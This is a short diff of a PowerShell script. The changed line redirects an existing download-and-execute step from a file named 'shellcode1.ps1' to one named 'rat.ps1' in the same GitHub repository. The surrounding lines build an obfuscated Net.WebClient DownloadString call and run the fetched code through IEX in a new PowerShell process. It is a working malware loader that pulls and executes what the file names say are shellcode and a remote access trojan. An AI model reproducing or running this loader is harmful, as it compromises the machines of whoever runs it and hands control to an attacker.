@@ -67,7 +67,7 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellc
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode1.ps1")
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/rat.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
